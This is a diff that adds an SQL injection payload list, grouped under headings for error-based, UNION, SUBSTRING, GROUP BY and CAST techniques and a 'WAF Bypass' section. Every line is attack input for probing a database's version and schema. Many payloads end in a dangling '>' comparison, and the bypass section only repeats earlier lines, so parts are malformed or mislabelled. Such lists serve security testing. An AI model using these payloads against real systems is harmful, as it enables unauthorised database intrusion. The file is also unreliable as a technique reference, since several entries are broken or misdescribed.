@@ -1,0 +1,48 @@
+# Basic Error-based SQLi
+' OR 1=1 AND 1=0
+' OR 1=1 AND 1=0 --
+' OR 1=1 AND 1=0 /*
+' OR 1=1 AND 1=0 #
+' OR 1=1 AND 1=0 AND 1=0
+' OR 1=1 AND 1=0 AND 1=0 --
+' OR 1=1 AND 1=0 AND 1=0 /*
+' OR 1=1 AND 1=0 AND 1=0 #
+
+# Information Gathering
+' AND (SELECT COUNT(*) FROM information_schema.tables)>
+' AND (SELECT COUNT(*) FROM information_schema.tables)> --
+' AND (SELECT COUNT(*) FROM information_schema.tables)> /*
+' AND (SELECT COUNT(*) FROM information_schema.tables)> #
+
+# Error-based with UNION
+' UNION SELECT 1,2,3,4,5 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a --
+' UNION SELECT 1,2,3,4,5 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a /*
+' UNION SELECT 1,2,3,4,5 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a #
+
+# Error-based with SUBSTRING
+' AND ASCII(SUBSTRING((SELECT version()),1,1))>
+' AND ASCII(SUBSTRING((SELECT version()),1,1))> --
+' AND ASCII(SUBSTRING((SELECT version()),1,1))> /*
+' AND ASCII(SUBSTRING((SELECT version()),1,1))> #
+
+# Error-based with GROUP BY
+' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)>
+' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)> --
+' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)> /*
+' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)> #
+
+# Error-based with CAST
+' AND CAST((SELECT version()) AS SIGNED)>
+' AND CAST((SELECT version()) AS SIGNED)> --
+' AND CAST((SELECT version()) AS SIGNED)> /*
+' AND CAST((SELECT version()) AS SIGNED)> #
+
+# WAF Bypass for Error-based
+' OR 1=1 AND 1=0
+' OR 1=1 AND 1=0 --
+' OR 1=1 AND 1=0 /*
+' OR 1=1 AND 1=0 #
+' AND (SELECT COUNT(*) FROM information_schema.tables)>
+' AND (SELECT COUNT(*) FROM information_schema.tables)> --
+' AND (SELECT COUNT(*) FROM information_schema.tables)> /*
+' AND (SELECT COUNT(*) FROM information_schema.tables)> #
